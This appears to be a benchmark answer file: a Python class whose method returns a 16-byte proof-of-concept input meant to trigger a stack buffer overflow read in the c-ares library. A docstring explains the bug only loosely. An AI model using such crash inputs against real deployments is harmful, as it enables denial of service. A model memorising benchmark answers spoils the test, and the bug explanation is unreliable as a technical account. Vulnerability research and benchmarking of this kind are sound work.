import os

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Stack Buffer Overflow
    vulnerability in c-ares (oss-fuzz:42534949).
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability exists in the `aestrdup_as_int` function. When parsing a
        string, if it starts with a '-', the pointer `s` is advanced past it.
        The code then checks if the rest of the string is "inf". If it's not,
        the pointer `s` is NOT moved back. Subsequently, `strtol` is called on this
        advanced pointer. This logic error can lead to a stack-buffer-overflow read.

        The PoC from the original bug report is "-111111111111111", which is
        16 bytes long and matches the ground-truth length. This input starts with a
        minus sign and is not "inf", thus triggering the vulnerable code path.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC input that triggers the vulnerability.
        """
        # A minus sign followed by 15 digits. Total length is 16 bytes.
        # This input triggers the flawed parsing logic.
        return b"-111111111111111"